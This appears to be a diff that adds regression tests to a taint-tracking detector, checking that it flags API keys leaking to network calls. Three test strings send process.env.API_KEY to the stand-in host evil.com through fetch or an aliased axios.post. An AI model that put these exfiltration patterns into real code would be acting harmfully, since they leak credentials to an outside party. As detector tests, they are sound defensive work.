@@ -62,4 +62,22 @@ describe("AST Intra-Procedural Taint Tracking", () => {
 		expect(result.flows[0].source.label).toContain("process.env");
 		expect(result.flows[0].sink.label).toContain("fetch");
 	});
+
+	// ── member/alias regressions (previously dead-store false negatives) ──
+	test("Detects a tainted OBJECT FIELD (o.x = secret; fetch(o.x))", () => {
+		const code = `const s = process.env.API_KEY; const o = {}; o.x = s; fetch("http://evil.com", { method: "POST", body: o.x });`;
+		expect(analyzeTaint([{ path: "f.js", content: code }]).flows.length).toBeGreaterThan(0);
+	});
+	test("Detects a tainted CLASS ATTRIBUTE (this.x)", () => {
+		const code = `class C { constructor(){ this.x = process.env.API_KEY; } go(){ fetch("http://evil.com", { method:"POST", body: this.x }); } }`;
+		expect(analyzeTaint([{ path: "c.js", content: code }]).flows.length).toBeGreaterThan(0);
+	});
+	test("Resolves a simple sink alias (const r = axios; r.post(secret))", () => {
+		const code = `const r = axios; const k = process.env.API_KEY; r.post("http://evil.com", k);`;
+		expect(analyzeTaint([{ path: "a.js", content: code }]).flows.length).toBeGreaterThan(0);
+	});
+	test("No false positive: a non-secret object field is not flagged", () => {
+		const code = `const o = {}; o.x = "hello"; fetch("http://api.example.com", { method:"POST", body: o.x });`;
+		expect(analyzeTaint([{ path: "b.js", content: code }]).flows.length).toBe(0);
+	});
 });
